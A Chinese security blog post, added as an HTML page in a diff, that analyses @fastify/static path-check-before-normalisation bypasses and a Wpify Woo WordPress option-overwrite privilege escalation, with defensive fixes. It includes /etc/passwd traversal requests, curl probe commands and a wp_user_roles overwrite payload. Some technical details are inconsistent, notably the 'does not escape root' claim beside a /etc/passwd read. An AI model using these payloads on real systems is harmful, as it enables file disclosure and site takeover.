@@ -1,0 +1,416 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <link rel="icon" type="image/png" sizes="32x32" href="/assets/images/cat-final.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="/assets/images/cat-final.png">
+    <link rel="apple-touch-icon" sizes="180x180" href="/assets/images/cat-final.png">
+    <link rel="shortcut icon" href="/assets/images/cat-final.png">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>路径校验先于归一化=白名单纸墙：Fastify/WordPress双CVE深度剖析 — DARKSEC</title>
+<meta name="description" content="先检查后归一化=检查失效。Fastify @fastify/static路径守卫绕过+WordPress K/V键名投毒提权，2026-07-26三枚CVE揭示安全校验顺序的根本错误。">
+<link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;500;700;900&family=Inter:wght@300;400;500;600;700&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="/css/style.css">
+</head>
+<body>
+<div class="container">
+  <header>
+    <a href="/" class="logo">DARK<span>SEC</span> <img src="/assets/images/cat-final.png" alt="cat" style="width:28px;height:28px;vertical-align:middle;margin-left:4px;"></a>
+    <nav>
+      <a href="/">首页</a>
+      <a href="/posts/" class="active">文章</a>
+      <a href="/tags/">标签</a>
+      <a href="/about.html">关于</a>
+    </nav>
+    <button class="mobile-menu" onclick="document.querySelector('nav').classList.toggle('show')">☰</button>
+  </header>
+
+  <main>
+    <a href="/" class="back-link">← 返回首页</a>
+
+    <article>
+      <div class="article-header">
+        <div class="category">◆ 路径安全 / 认证绕过 / 提权</div>
+        <h1>路径校验先于归一化=白名单纸墙：Fastify/WordPress双CVE深度剖析 🛤️🔓</h1>
+        <div class="article-meta">
+          <span>📅 2026-07-26</span>
+          <span>⏱ 16 min read</span>
+          <span>🏷 路径归一化 / K/V投毒 / 提权 / CVE</span>
+        </div>
+      </div>
+
+      <div class="article-content">
+        <div class="toc">
+          <h4>◆ 目录</h4>
+          <ul>
+            <li><a href="#intro">漏洞概述</a></li>
+            <li><a href="#normalize">路径归一化的安全盲区</a></li>
+            <li><a href="#fastify">CVE-2026-15074：dot-dot段绕过</a></li>
+            <li><a href="#fastify2">CVE-2026-7120：非规范路径绕过</a></li>
+            <li><a href="#wordpress">CVE-2026-12736：K/V键名投毒</a></li>
+            <li><a href="#model">通用攻击模型</a></li>
+            <li><a href="#audit">审计方法</a></li>
+            <li><a href="#defense">防御建议</a></li>
+          </ul>
+        </div>
+
+        <h2 id="intro">🎯 漏洞概述</h2>
+        <p>安全校验的<strong>顺序</strong>往往比校验本身更重要。今天分析的三个CVE揭示了同一根因的两种变体：</p>
+        <ul>
+          <li>🔥 <strong>CVE-2026-15074</strong>（@fastify/static，CVSS 7.5）：路径白名单在归一化<strong>之前</strong>执行，dot-dot段绕过路由守卫</li>
+          <li>🔥 <strong>CVE-2026-7120</strong>（@fastify/static，CVSS 5.3）：非规范等价路径绕过allowedPath回调</li>
+          <li>🔥 <strong>CVE-2026-12736</strong>（Wpify Woo，CVSS 8.0）：REST API允许用户控制K/V存储的键名→覆盖安全关键配置→提权</li>
+        </ul>
+
+        <blockquote>
+          <p>🎯 核心洞察：<strong>「先检查、后归一化」= 检查对象和实际操作对象不是同一个</strong>。这不是路径穿越漏洞（不逃出root），而是路径守卫/白名单的完整性被彻底破坏。同样的模式——<strong>校验层和执行层看到的不是同一个输入</strong>——也出现在K/V键名投毒中：校验层检查的是值（value），攻击面在键（key）。</p>
+        </blockquote>
+
+        <h2 id="normalize">🔧 路径归一化的安全盲区</h2>
+        <p>Web服务器处理请求路径时，通常有三个步骤：</p>
+
+        <pre><code>┌──────────────────────────────────────────────────┐
+│  请求路径: /assets/../../../etc/passwd             │
+├──────────────────────────────────────────────────┤
+│  Step 1: 安全检查（allowedPath回调）               │
+│  → 看到原始路径: /assets/../../../etc/passwd       │
+│  → 匹配 /assets/* 前缀 → ✅ 通过                  │
+├──────────────────────────────────────────────────┤
+│  Step 2: 路径归一化（send库内部）                   │
+│  → 处理 ../: /assets/../../../etc/passwd           │
+│  → 归一化结果: /etc/passwd                         │
+├──────────────────────────────────────────────────┤
+│  Step 3: 文件系统操作                               │
+│  → serveFile("/etc/passwd") → 🔥 任意文件读取!     │
+└──────────────────────────────────────────────────┘</code></pre>
+
+        <p>问题的关键：Step 1的allowedPath看到的是<strong>归一化前</strong>的路径，而Step 3的文件系统操作使用的是<strong>归一化后</strong>的路径。两者不是同一个字符串！</p>
+
+        <h3>归一化的完整维度</h3>
+        <p>路径归一化不仅仅是处理<code>../</code>，还包括：</p>
+
+        <pre><code># 归一化维度一览（每个都可能成为绕过向量）
+
+1. dot-dot段     /a/../b         →  /b
+2. 重复斜杠      /a//b           →  /a/b
+3. 尾部斜杠      /a/             →  /a
+4. 点段          /a/./b          →  /a/b
+5. URL编码       /a%2Fb          →  /a/b  （%2F = /）
+6. Unicode等价   NFC vs NFD      →  不同的字节序列
+7. 大小写        /ABC vs /abc    →  取决于文件系统
+8. 符号链接      /link → /real   →  需要额外解析</code></pre>
+
+        <blockquote>
+          <p>🔥 <strong>归一化不完整的任何维度都可能成为绕过向量</strong>。CVE-2026-6414（原始补丁）只处理了URL编码斜杠，攻击者改用dot-dot段和重复斜杠绕过——这是典型的「补丁不完整绕过」。</p>
+        </blockquote>
+
+        <h2 id="fastify">💥 CVE-2026-15074：dot-dot段绕过</h2>
+        <p>@fastify/static的<code>allowedPath</code>回调是一个用户自定义的路径白名单函数，用于限制哪些路径可以被静态文件服务。例如：</p>
+
+        <pre><code>// 典型配置：只允许 /assets/ 目录下的文件
+fastify.register(require('@fastify/static'), {
+  root: '/var/www/public',
+  allowedPath: (path) => path.startsWith('/assets/')
+})</code></pre>
+
+        <p>攻击者构造请求：</p>
+
+        <pre><code># 请求路径（绕过allowedPath的startsWith检查）
+GET /assets/../../../etc/passwd HTTP/1.1
+
+# allowedPath看到: /assets/../../../etc/passwd
+# startsWith('/assets/') → ✅ 通过！
+
+# send库归一化后: /etc/passwd
+# 文件系统读取: /var/www/public/etc/passwd → /etc/passwd</code></pre>
+
+        <p><strong>根因</strong>：<code>allowedPath</code>回调在<code>send</code>库的路径归一化<strong>之前</strong>被调用。两个阶段看到的路径不同：</p>
+
+        <pre><code>// 漏洞代码的调用顺序
+function onRequest(req, reply, next) {
+  const path = req.url;              // 原始路径
+
+  // ❌ 先检查（归一化前的路径）
+  if (opts.allowedPath && !opts.allowedPath(path)) {
+    return reply.code(403).send();
+  }
+
+  // ✅ 后归一化（send库内部做）
+  send(req, path, { root: opts.root })
+    // send内部: normalize(path) → 归一化
+    // → 用归一化后的路径访问文件系统
+}</code></pre>
+
+        <h3>正确顺序</h3>
+        <pre><code>// 修复后的正确顺序
+function onRequest(req, reply, next) {
+  const rawPath = req.url;
+
+  // ✅ 先归一化
+  const normalizedPath = normalizePath(rawPath);
+
+  // ✅ 再检查（归一化后的路径）
+  if (opts.allowedPath && !opts.allowedPath(normalizedPath)) {
+    return reply.code(403).send();
+  }
+
+  send(req, normalizedPath, { root: opts.root })
+}</code></pre>
+
+        <h2 id="fastify2">💥 CVE-2026-7120：非规范等价路径绕过</h2>
+        <p>这是CVE-2026-6414补丁不完整绕过的第二个变体。即使服务端在某种程度上处理了<code>../</code>，<strong>非规范等价路径</strong>仍然可以绕过：</p>
+
+        <pre><code># 非规范等价路径示例
+
+// 规范路径（allowedPath检查的）
+/etc/passwd
+
+// 非规范等价形式（绕过检查但解析到同一文件）
+//etc/passwd         → 重复前导斜杠
+/etc/passwd/        → 尾部斜杠
+/etc/./passwd       → 点段
+/etc//passwd        → 双斜杠
+/ETC/passwd         → 大小写（某些文件系统）
+/etc/passwd%00      → 空字节截断（某些语言）</code></pre>
+
+        <p>攻击者可以组合使用这些变体，构造一个在字符串比较中不同于规范路径、但在文件系统解析中等价的路径字符串。</p>
+
+        <blockquote>
+          <p>🎯 这两个CVE共同证明：<strong>路径安全校验的正确顺序是 <code>原始路径→归一化→归一化后路径→安全检查→文件系统操作</code></strong>。任何将安全检查放在归一化之前的实现都有此缺陷。这是架构级问题，不是某个特定编码的绕过。</p>
+        </blockquote>
+
+        <h2 id="wordpress">💥 CVE-2026-12736：K/V键名投毒</h2>
+        <p>WordPress的Wpify Woo插件暴露了一个REST API端点：</p>
+
+        <pre><code># 端点：保存任意option
+POST /wp-json/wpify-woo/v1/option
+Content-Type: application/json
+
+{
+  "option": "任意键名",
+  "data": "任意值"
+}</code></pre>
+
+        <p>后端代码直接调用<code>update_option()</code>，<strong>无键名白名单</strong>：</p>
+
+        <pre><code>// 漏洞代码
+function save_option(request) {
+  const option = request.body.option;  // 用户控制的键名
+  const data = request.body.data;      // 用户控制的值
+
+  // ❌ 没有白名单检查！
+  update_option(option, data);
+  // option可以是 wp_user_roles, active_plugins, siteurl 等任何键
+}</code></pre>
+
+        <h3>攻击链：从Shop Manager到Administrator</h3>
+
+        <pre><code># Step 1: 覆盖用户角色定义
+POST /wp-json/wpify-woo/v1/option
+{
+  "option": "wp_user_roles",
+  "data": {
+    "administrator": {
+      "name": "Administrator",
+      "capabilities": {
+        "switch_themes": true,
+        "edit_themes": true,
+        "activate_plugins": true,
+        "edit_plugins": true,
+        "edit_users": true,
+        "edit_files": true,
+        "manage_options": true,
+        "level_10": true,
+        "create_users": true,
+        "delete_users": true
+      }
+    },
+    "shop_manager": {
+      "name": "Shop Manager",
+      "capabilities": {
+        "switch_themes": true,
+        "edit_themes": true,
+        "activate_plugins": true,
+        "edit_plugins": true,
+        "edit_users": true,
+        "manage_options": true,
+        "level_10": true,
+        "create_users": true
+      }
+    }
+  }
+}
+
+# Step 2: 刷新页面 → Shop Manager现在拥有所有管理员权限！</code></pre>
+
+        <blockquote>
+          <p>🔥 核心洞察：<strong>K/V存储的安全模型是扁平且全局的</strong>——没有「命名空间隔离」或「键所有权」概念。WordPress的<code>update_option()</code>对键名无白名单，任何字符串都可以。攻击者不需要SQLi/RCE——覆盖<code>user_roles</code>序列化数组即可添加管理员能力。这是<strong>数据存储层的授权绕过</strong>。</p>
+        </blockquote>
+
+        <h3>K/V键名投毒的通用模式</h3>
+
+        <pre><code># 通用攻击模式
+
+                   ┌─────────────────────────┐
+                   │  用户请求                │
+                   │  key = "安全关键配置键"  │
+                   │  value = "恶意值"        │
+                   └─────────┬───────────────┘
+                             │
+                   ┌─────────▼───────────────┐
+                   │  API端点                 │
+                   │  检查: 用户有写权限？ ✅  │
+                   │  检查: key有白名单？ ❌   │
+                   └─────────┬───────────────┘
+                             │
+                   ┌─────────▼───────────────┐
+                   │  K/V存储                 │
+                   │  SET(key, value)         │
+                   │  覆盖了: siteurl         │
+                   │  覆盖了: wp_user_roles   │
+                   │  覆盖了: active_plugins  │
+                   └─────────────────────────┘
+
+# 同一模式也适用于:
+# - Redis: SET config:admin_password attacker_value
+# - etcd:  PUT /v2/keys/config/admin_token value
+# - Consul: PUT /v1/kv/config/admin value
+# - Firebase: PUT /config/admin.json value</code></pre>
+
+        <h2 id="model">🧠 通用攻击模型：校验层与执行层的语义断裂</h2>
+        <p>这三个CVE共享同一个根因模型——<strong>校验层和执行层对同一输入有不同理解</strong>：</p>
+
+        <pre><code># 语义断裂的三种变体
+
+┌─────────────────────────────────────────────────────┐
+│  变体1: 时序断裂（Fastify路径归一化）                  │
+│  校验层: 原始路径 → allowedPath()                     │
+│  执行层: 归一化路径 → 文件系统操作                     │
+│  断裂点: 归一化发生在校验之后                          │
+├─────────────────────────────────────────────────────┤
+│  变体2: 空间断裂（WordPress K/V投毒）                  │
+│  校验层: 检查value的类型/格式                          │
+│  执行层: key直接映射到安全关键配置                      │
+│  断裂点: 攻击面在key而非value                          │
+├─────────────────────────────────────────────────────┤
+│  变体3: 等价性断裂（非规范路径）                       │
+│  校验层: 字符串精确比较 "/etc/passwd"                   │
+│  执行层: 文件系统将 "//etc/passwd" 等价处理             │
+│  断裂点: 字符串等价 ≠ 文件系统等价                      │
+└─────────────────────────────────────────────────────┘</code></pre>
+
+        <p>这种语义断裂模式在安全漏洞中极其常见——之前的SAML签名解析器差异（验证器和消费者用不同XML解析器）、认证协议解析器差异、以及所有「两阶段处理」的漏洞都属于同一类。</p>
+
+        <h2 id="audit">🔍 审计方法</h2>
+
+        <h3>路径归一化审计</h3>
+        <pre><code># 1. 找到所有路径安全检查
+grep -rn "allowedPath\|path\.startsWith\|path\.match\|path\.test" \
+  --include="*.js" --include="*.ts" node_modules/@fastify/ src/
+
+# 2. 确认归一化位置
+# 关键问题: allowedPath回调在send/serveFile之前还是之后？
+# 如果之前 → 漏洞
+
+# 3. 测试非规范路径
+curl http://target/assets/../../../etc/passwd
+curl http://target/assets//etc/passwd
+curl http://target/assets/./etc/passwd
+curl http://target/assets/etc/passwd/
+curl http://target/assets/%2e%2e/%2e%2e/etc/passwd</code></pre>
+
+        <h3>K/V键名投毒审计</h3>
+        <pre><code># 1. 找到所有REST API中接受键名参数的端点
+grep -rn "update_option\|set_option\|SET\b" --include="*.php" --include="*.js"
+
+# 2. 检查键名白名单
+# 如果没有 in_array($key, $allowed_keys) 或类似的白名单 → 漏洞
+
+# 3. 枚举高价值目标键
+# WordPress: wp_user_roles, active_plugins, siteurl, admin_email
+# Redis: config:admin_password, config:api_key
+# etcd: /config/admin_token, /config/secret_key</code></pre>
+
+        <h2 id="defense">🛡️ 防御建议</h2>
+
+        <h3>路径安全校验</h3>
+        <pre><code>// ✅ 正确：先归一化，再校验
+const normalizedPath = path.normalize(request.url);
+if (!allowedPath(normalizedPath)) {
+  return reply.code(403).send();
+}
+send(request, normalizedPath, { root });
+
+// ✅ 归一化必须覆盖所有维度
+function normalizePath(p) {
+  // 1. 解码URL编码
+  p = decodeURIComponent(p);
+  // 2. 解析dot-dot和点段
+  p = path.normalize(p);
+  // 3. 去除重复斜杠
+  p = p.replace(/\/+/g, '/');
+  // 4. 确保以/开头
+  if (!p.startsWith('/')) p = '/' + p;
+  return p;
+}</code></pre>
+
+        <h3>K/V键名白名单</h3>
+        <pre><code>// ✅ 正确：显式白名单
+const ALLOWED_OPTIONS = [
+  'wp_woo_currency',
+  'wp_woo_shipping_method',
+  'wp_woo_tax_rate'
+];
+
+function save_option(request) {
+  const option = request.body.option;
+  const data = request.body.data;
+
+  // ✅ 白名单检查
+  if (!ALLOWED_OPTIONS.includes(option)) {
+    return reply.code(403).send({ error: '不允许修改此配置' });
+  }
+
+  update_option(option, data);
+}</code></pre>
+
+        <blockquote>
+          <p>🔥 <strong>黄金法则</strong>：安全校验必须在归一化/标准化<strong>之后</strong>执行，且校验的对象必须和实际操作的对象<strong>完全相同</strong>。任何「先检查、后转换」的模式都是潜在的语义断裂点。对于K/V存储，<strong>键名和值都需要白名单</strong>——不能只检查值而信任键名。</p>
+        </blockquote>
+
+        <div class="article-tags">
+          <span class="tag pink">路径归一化</span>
+          <span class="tag">K/V投毒</span>
+          <span class="tag purple">CVE-2026-15074</span>
+          <span class="tag purple">CVE-2026-7120</span>
+          <span class="tag purple">CVE-2026-12736</span>
+          <span class="tag yellow">提权</span>
+          <span class="tag">Fastify</span>
+          <span class="tag">WordPress</span>
+        </div>
+      </div>
+    </article>
+  </main>
+
+  <footer>
+      <div style="text-align:center;margin-bottom:16px;">
+          <img src="/assets/images/cat-final.png" alt="cat" style="width:24px;height:24px;vertical-align:middle;opacity:0.7;">
+          <span style="color:var(--text-dim);margin:0 8px;">‧</span>
+          <img src="/assets/images/cat-final.png" alt="cat" style="width:24px;height:24px;vertical-align:middle;opacity:0.7;">
+          <span style="color:var(--text-dim);margin:0 8px;">‧</span>
+          <img src="/assets/images/cat-final.png" alt="cat" style="width:24px;height:24px;vertical-align:middle;opacity:0.7;">
+        </div>
+    <div class="footer-content">
+      <p>© 2026 <span class="neon-text">DARKSEC</span> CYBERCAT SECURITY LAB <img src="/assets/images/cat-final.png" alt="cat" style="width:1.2em;height:1.2em;vertical-align:middle;"></p>
+      <p class="quote">「 先归一化再校验——顺序反了就等于没验 nya~ 」</p>
+      <div class="links">
+        <a href="https://github.com/deft-dream" target="_blank">GitHub</a>
+        <span>·</span>
+        <a href="mailto:s815887892@163.com">Contact</a>
+      </div>
+    </div>
+  </footer>
+</div>
+~ 感谢阅读 nya~ 🐱✨
+</body>
+</html>
